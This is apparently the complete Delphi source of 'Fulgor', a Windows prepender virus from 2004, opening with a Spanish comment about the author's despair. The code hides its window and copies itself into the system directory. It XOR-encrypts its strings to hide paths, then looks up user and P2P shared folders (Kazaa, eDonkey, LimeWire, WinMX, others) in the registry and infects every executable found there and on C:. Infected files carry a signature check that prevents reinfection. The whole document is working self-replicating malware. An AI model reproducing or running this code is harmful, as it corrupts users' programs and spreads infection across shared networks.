   program Fulgor;    // mi primer Delphi prepender virus.. y el ultimo./(quiza)

   {    25 de Junio 2004
     Eran las 8:30 o quizás las 9 am, estaba en clase, junto a la sociedad
     la cual odio; estaba un poco deprimido...
     me fue arrevatada entonces mi botella de agua...
     me la han gastado... me he llenado de ira y se la  he arrebatado al tipo
     y calló por la ventana... oh no... un auto ha sido dañado
     ahora tengo miedo... enfrento una demanda... tendré que pagar
     los daños... Dos horas despues aquella persona se toma
     de novio a la persona que tanto tanto me gustaba...
     dios.. quizas no salga vivo... 1 hora despues estoy
     en el camión pensando en lo que haré y lo que dejaré...
     5  minutos después he pensado en dejar todo  y recuperar
     el tiempo que he perdido... mi vida perdida...
     y se me ha venido a la mente la palabra "Fulgor"
     Fulgor es mi muerte... fulgor es mi adicción...
     fulgor es esto...
     BioCodeado un 25 de junio.... a las 5:41 pm.
   }

   {$APPTYPE CONSOLE}

   uses
     SysUtils,Windows,Registry;

   Const
     VirusSize = 55808 ;        // tamaño de la especie viral en bytes

   var
   Author:string = 'Written by Falckon';
   MC,MC2,MC8:file;
   bufer:array[1..VirusSize] of char;
   DirToInfect:Array[1..11] of string;
   ArchivosDePrograma:string;
   ip:integer;
   apl:cardinal;
   function Systex():string;
   var
     windozer:pChar;
     begin
       GetMem(windozer,100);
       if GetSystemDirectory(windozer,100) <> 0 then begin
         Systex := Windozer + '\';
       end;
       FreeMem(windozer,100);
   end;
   Function crypt(text:string):string;
   var
     criptado:string;
     puta,p,llave:integer;
    begin
      llave := strLen('Fulgor');
      puta := strLen(PChar(text));
        For p := 1 to puta do begin
        criptado := criptado + chr(ord(text[p]) xor llave);
    end;
    crypt := criptado;
   end;
   procedure regeneralo();
   var
   PK,MZ:File;
   archivo:String;
   bufer2:array[1..VirusSize] of char;
   NR,NW,b:integer;
   SI: TStartupInfo;
   PI: TProcessInformation;
   begin
   Randomize;
   archivo := systex+'temp'+inttostr(Random(5000))+'.tmp';
   Copyfile(Pchar(ParamStr(0)),PChar(ParamStr(0) + '.tmp'),false);
   AssignFile(PK,ParamStr(0) + '.tmp');
   Reset(PK,1);
   AssignFile(MZ,archivo);
   Rewrite(MZ,1);
   Seek(PK,VirusSize);
   repeat
   BlockRead(PK, Bufer2, SizeOf(Bufer2), NR);
   BlockWrite(MZ, Bufer2, NR, NW);
   until (NR = 0) or (NW <> NR);
   Close(PK);
   Close(MZ);
   CreateProcessA(PCHAR(archivo),NIL,nil, nil, False, 0, nil, nil, SI, PI);
   end;

   procedure tusabes(jojo:string);
   var
   buf:array[1..VirusSize] of Char;
   mierda,puta:integer;
   virus, host, tempfile:File;
   begin
   if fileexists(jojo) then begin
    AssignFile(virus,Systex + 'fulgor.exe');
       Reset(virus,1);
     AssignFile(host,jojo);
        Reset(host,1);
     AssignFile(tempfile,jojo+crypt('(`sjait'));
       ReWrite(tempfile,1);
     Repeat
       BlockRead(virus,buf,Sizeof(buf),mierda);
       BlockWrite(tempfile,buf,mierda,puta);
     Until (mierda = 0) or (puta <> mierda);
     Repeat
       BlockRead(host,buf,sizeof(buf),mierda);
       BlockWrite(tempfile,buf,mierda,puta);
     Until (mierda = 0) or (puta <> mierda);
       BlockWrite(tempfile,'Fulgor',6);
     CloseFile(tempfile);
     CloseFile(Host);
     CloseFile(virus);
     Copyfile(pchar(jojo+crypt('(`sjait')),pchar(jojo),false);
     Deletefile(pchar(jojo+crypt('(`sjait')));
     end;
   end;
   Function LeerReg(key:hkey;ruta:string;valor:string):string;
   var
   reg:Tregistry;
   begin
     Reg := TRegistry.Create;
     Reg.RootKey := key;
      if Reg.OpenKeyReadOnly(ruta) then
      begin
       Result := reg.ReadString(valor);
      end;
   end;

   function rghst(muaja:string):boolean;
   var
   Viral,MC3:file;
   firma:string;
   buf:array[1..VirusSize] of Char;
   i,p,resulta:integer;
   begin
     FileMode:=2;
     {$I-}
     AssignFile(MC3, muaja);
       Reset(MC3, 1);
     CloseFile(MC3);
     {$I+}
     resulta := IOResult;
     FileMode := 0 ;
     if resulta = 5 + 6 - 11 then begin
       AssignFile(Viral,muaja);
       reset(viral,1);
       Seek(Viral,FileSize(Viral) -6);
       BlockRead(Viral,buf,sizeof(buf),p);
         For i := 1 to sizeof(buf) do begin
           firma := firma + buf[i]
         end;
       if pchar(firma) = Crypt('@sjait') then begin
         rghst := True;
       end
       else  begin
        rghst := false
       end;
       closefile(viral);
     end
     else begin
       Result := false;
     end;
   end;
   procedure files(path:string);
     var
       Muaja:TSearchRec;
       begin
       FindFirst(path +crypt('Z,(c~c'),faArchive+faHidden,Muaja);
       if rghst(path+'\'+muaja.name) = false then
           begin
           tusabes(path+'\'+muaja.name);
          // writeln(path+'\'+muaja.name);
         end;
         While FindNext(Muaja) = 0 do begin
         if rghst(path+'\'+muaja.name) = false then
           begin
          tusabes(path+'\'+muaja.name);
          end;
       end;
     end;
   procedure Dir(path:string);
     var
       Shit:TSearchRec;
       begin
       FindFirst(path + '\.*',faDirectory,Shit);
       files(path +'\'+shit.Name) ;
        While FindNext(Shit) = 0 do
           begin
           if shit.name <> '..' then begin
           //writeLn(path +'\'+shit.Name);
           files(path +'\'+shit.Name);
           end;
         end;
     end;
   begin
      ShowWindow(FindWindowA(0,pChar(ParamStr(0))),0);  //hide aplication
   //Liberamos copia limpia que servirá para infectar :)
   if not fileexists(systex + 'fulgor.exe') then begin
       Copyfile(pchar(ParamStr(0)),Pchar(Systex + crypt('`sjait(rkv')),false);
       AssignFile(MC,Systex + crypt('`sjait(rkv'));
         Reset(MC,1);
       AssignFile(MC2,Systex +crypt('`sjait(c~c'));
         ReWrite(MC2,1);
         BlockRead(MC,bufer,VirusSize);
         BlockWrite(MC2,bufer,VirusSize);
       Closefile(MC);
       CloseFile(MC2);
       DeleteFile(Pchar(Systex+crypt('`sjait(rkv')));
   end;
     regeneralo();
     ArchivosDePrograma:= LeerReg(HKEY_LOCAL_MACHINE,crypt('ZUI@RQGTCZKoetiui`rZQohbiquZEsttchrPctuoih'),Crypt('Vtiatgk@ojcuBot'));
     DirToInfect[1] := LeerReg(HKEY_CURRENT_USER,crypt('ZUi`rqgtcZKoetiui`rZQohbiquZEsttchrPctuoihZC~vjitctZUncjj&@ijbctu'),crypt('Bcumriv'));
     DirToInfect[2] := LeerReg(HKEY_CURRENT_USER,crypt('ZUi`rqgtcZKoetiui`rZQohbiquZEsttchrPctuoihZC~vjitctZUncjj&@ijbctu'),crypt('Vctuihgj'));
     DirToInfect[3] := LeerReg(HKEY_CURRENT_USER,crypt('ZUi`rqgtcZKoetiui`rZOhrcthcr&C~vjitct'),crypt('Biqhjigb&Botcerit '));
     DirToInfect[4] :=  ArchivosdePrograma ;
     DirToInfect[5] := ArchivosdePrograma+crypt('ZMg\gGZK &Ungtcb&@ijbct');
     DirToInfect[6] := ArchivosdePrograma+crypt('Zcbihmc 4666Zoheikoha');
     DirToInfect[7] := crypt('E<Zk &ungtcb&`ijbct');
     DirToInfect[8] := ArchivosdePrograma+crypt('ZjokcqotcZungtcb');
     DirToInfect[9] := ArchivosdePrograma+crypt('ZIpcthcrZOheikoha');
     DirToInfect[9] := ArchivosdePrograma+crypt('ZTgvoagritZUngtcZ');
     DirToInfect[10] := ArchivosdePrograma+crypt('ZRcujgZ@ojcu');
     DirToInfect[11] := Archivosdeprograma+ crypt('ZQohK^ZK &Ungtcb&@ijbct');
     For ip := 1 to 11 do
       begin
         if DirectoryExists(DirToInfect[ip]) then begin
           Dir(DirToInfect[ip]);
            //writeln(DirToInfect[ip]);
            files(DirToInfect[ip])
         end;
     end;
     Dir('C:');
     files('C:') ;

   end.

   //Finished 26 de junio de 2004, 2:01 pm
